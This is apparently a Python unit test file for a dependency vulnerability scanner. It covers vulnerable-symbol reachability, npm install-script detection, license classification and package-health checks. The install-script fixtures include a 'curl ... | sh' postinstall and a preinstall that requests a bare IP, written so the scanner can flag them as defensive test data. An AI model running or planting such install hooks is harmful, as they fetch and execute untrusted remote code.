"""Function-level reachability, install scripts, deps.dev health and license checks (network mocked)."""

import json
import os
import unittest

from vulnfind import depgraph, depintel, reach
from vulnfind.models import Finding, Package, Severity
from vulnfind.walker import IgnoreConfig, walk

from helpers import TempProject

GO_VULN = {"id": "GO-2023-2402", "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"},
                                               "ecosystem_specific": {"imports": [{"path": "golang.org/x/crypto/ssh",
                                                                                   "symbols": ["Client.Dial", "NewClientConn"]}]}}]}
NPM_VULN = {"id": "GHSA-x", "summary": "Command injection in `_.template()`",
            "details": "Calling `template` with untrusted `options.variable` (see the `merge` helper) allows code injection. Version `4.17.20`."}


class SymbolsTest(unittest.TestCase):
    def test_symbol_sources(self):
        self.assertEqual(reach.symbols_for(GO_VULN, "golang.org/x/crypto", "Go"), ["Client.Dial", "NewClientConn"])
        self.assertEqual(reach.symbol_source(GO_VULN), "osv")
        syms = reach.symbols_for(NPM_VULN, "lodash", "npm")
        self.assertIn("_.template", syms)
        self.assertNotIn("options.variable", [s for s in syms if s == "variable"])
        self.assertFalse([s for s in syms if s.startswith("4.")])
        self.assertIsNone(reach.symbol_source(NPM_VULN))

    def test_usage_by_alias(self):
        js_used = "const _ = require('lodash');\nconst t = _.template(src);\n"
        js_unused = "import _ from 'lodash';\n_.map(xs, f);\n"
        js_named = "import { template as tpl } from 'lodash';\ntpl('x')\n"
        self.assertEqual(reach.used_symbols("js", js_used, "lodash", ["_.template"]), ["_.template"])
        self.assertEqual(reach.used_symbols("js", js_unused, "lodash", ["_.template"]), [])
        self.assertEqual(reach.used_symbols("js", js_named, "lodash", ["tpl"]), ["tpl"])
        py = "import yaml as y\ndata = y.full_load(s)\n"
        self.assertEqual(reach.used_symbols("py", py, "yaml", ["yaml.full_load"]), ["yaml.full_load"])
        self.assertEqual(reach.used_symbols("py", "import json\njson.loads(s)\n", "yaml", ["full_load"]), [])
        go = 'import (\n\t"golang.org/x/crypto/ssh"\n)\nfunc f() { c, _ := ssh.NewClientConn(a, b, cfg); c.Dial("tcp", x) }\n'
        self.assertEqual(reach.used_symbols("go", go, "golang.org/x/crypto", ["Client.Dial", "NewClientConn"]), ["Client.Dial", "NewClientConn"])
        js_method = "const express = require('express');\napp.get('/', (req, res) => res.redirect(req.query.u));\n"
        self.assertEqual(reach.used_symbols("js", js_method, "express", ["res.redirect"]), ["res.redirect"])

    def test_annotate_and_priority(self):
        with TempProject({"main.go": 'package main\nimport "golang.org/x/crypto/ssh"\nfunc main() { ssh.NewClientConn(a, b, c) }\n',
                          "other.go": "package main\n"}) as root:
            reached = Finding("CVE-1", "t", Severity.HIGH, "dependency", "go.mod",
                              extra={"package": "golang.org/x/crypto", "ecosystem": "Go", "vulnerable_symbols": ["NewClientConn"], "symbol_source": "osv"})
            unreached = Finding("CVE-2", "t", Severity.HIGH, "dependency", "go.mod",
                                extra={"package": "golang.org/x/crypto", "ecosystem": "Go", "vulnerable_symbols": ["Server.Serve"], "symbol_source": "osv"})
            reach.annotate([reached, unreached], root, {("go", "golang.org/x/crypto/ssh"): ["main.go"]})
            self.assertEqual((reached.extra["symbol_reachable"], reached.extra["called_symbols"]), (True, ["NewClientConn"]))
            self.assertFalse(unreached.extra["symbol_reachable"])
            from vulnfind.enrich import prioritise
            prioritise([reached, unreached])
            self.assertGreaterEqual(reached.extra["priority"] - unreached.extra["priority"], 25)


class InstallScriptTest(unittest.TestCase):
    def test_project_and_dependency_scripts(self):
        lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/evil": {"version": "1.0.0", "hasInstallScript": True},
                                                   "node_modules/esbuild": {"version": "0.20.0", "hasInstallScript": True}}}
        files = {
            "package.json": json.dumps({"scripts": {"postinstall": "curl -s https://x.example/i.sh | sh", "test": "jest"}}),
            "package-lock.json": json.dumps(lock),
            "node_modules/evil/package.json": json.dumps({"scripts": {"preinstall": "node -e \"require('https').get('http://1.2.3.4/x')\""}}),
            "node_modules/esbuild/package.json": json.dumps({"scripts": {"postinstall": "node install.js"}}),
        }
        with TempProject(files) as root:
            manifests = [f for f in walk(root, IgnoreConfig(), use_gitignore=False, include_vendor=False)
                         if f.name in ("package.json", "package-lock.json")]
            found = depgraph.install_script_findings(manifests, root)
        got = {(f.rule_id, f.severity.label, f.extra.get("package")) for f in found}
        self.assertIn(("DEP-SUSPICIOUS-INSTALL-SCRIPT", "MEDIUM", None), got)  # project's own curl | sh
        self.assertIn(("DEP-SUSPICIOUS-INSTALL-SCRIPT", "HIGH", "evil"), got)
        self.assertNotIn(("DEP-SUSPICIOUS-INSTALL-SCRIPT", "HIGH", "esbuild"), got)  # benign build step
        self.assertIn("DEP-INSTALL-SCRIPTS", {f.rule_id for f in found})


class LicenseTest(unittest.TestCase):
    def test_classify(self):
        self.assertEqual(depintel.classify("MIT"), "permissive")
        self.assertEqual(depintel.classify("GPL-3.0-only"), "strong")
        self.assertEqual(depintel.classify("LGPL-2.1"), "weak")
        self.assertEqual(depintel.classify("AGPL-3.0"), "network")
        self.assertEqual(depintel.classify("MIT OR GPL-3.0"), "permissive")  # you may pick MIT
        self.assertEqual(depintel.classify("MIT AND GPL-2.0"), "strong")
        self.assertEqual(depintel.classify("non-standard"), "unknown")

    def test_project_license_detection(self):
        with TempProject({"LICENSE": "MIT License\n\nPermission is hereby granted, free of charge..."}) as root:
            self.assertEqual(depintel.project_license(root), ("MIT", "permissive"))
        with TempProject({"package.json": json.dumps({"license": "AGPL-3.0-only"})}) as root:
            self.assertEqual(depintel.project_license(root)[1], "network")
        with TempProject({"x.py": ""}) as root:
            self.assertEqual(depintel.project_license(root)[1], "proprietary")


class HealthTest(unittest.TestCase):
    def setUp(self):
        db = {
            "/systems/NPM/packages/request": {"versions": [{"publishedAt": "2020-02-11T16:35:36Z"}]},
            "/systems/NPM/packages/request/versions/2.88.2": {"isDeprecated": True, "deprecatedReason": "request has been deprecated",
                                                              "licenses": ["Apache-2.0"],
                                                              "relatedProjects": [{"projectKey": {"id": "github.com/request/request"},
                                                                                   "relationType": "SOURCE_REPO"}]},
            "/projects/github.com%2Frequest%2Frequest": {"scorecard": {"checks": [{"name": "Maintained", "score": 0}]}},
            "/systems/NPM/packages/gpl-lib": {"versions": [{"publishedAt": "2026-10-01T00:00:00Z"}]},
            "/systems/NPM/packages/gpl-lib/versions/1.0.0": {"licenses": ["GPL-3.0-only"]},
            "/systems/NPM/packages/devtool": {"versions": [{"publishedAt": "2026-10-01T00:00:00Z"}]},
            "/systems/NPM/packages/devtool/versions/1.0.0": {"licenses": ["AGPL-3.0"]},
        }
        self.orig = depintel._get
        depintel._get = lambda url, timeout=20: db.get(url[len(depintel.API):], {})

    def tearDown(self):
        depintel._get = self.orig

    def test_findings(self):
        pkgs = [Package("request", "2.88.2", "npm", "package-lock.json", direct=True),
                Package("gpl-lib", "1.0.0", "npm", "package-lock.json", direct=True),
                Package("devtool", "1.0.0", "npm", "package-lock.json", direct=True, dev=True),
                Package("transitive", "1.0.0", "npm", "package-lock.json", direct=False)]
        with TempProject({"LICENSE": "Permission is hereby granted, free of charge"}) as root:
            found, warns = depintel.intel_findings(pkgs, root)
        got = {(f.rule_id, f.extra["package"], f.severity.label) for f in found}
        self.assertIn(("DEP-DEPRECATED", "request", "MEDIUM"), got)
        self.assertIn(("DEP-UNMAINTAINED", "request", "MEDIUM"), got)  # 6+ years, Scorecard Maintained 0
        self.assertIn(("LICENSE-COPYLEFT", "gpl-lib", "MEDIUM"), got)
        self.assertFalse([g for g in got if g[1] in ("devtool", "transitive")])  # dev deps not shipped; transitive off by default
        self.assertEqual(warns, [])


if __name__ == "__main__":
    unittest.main()
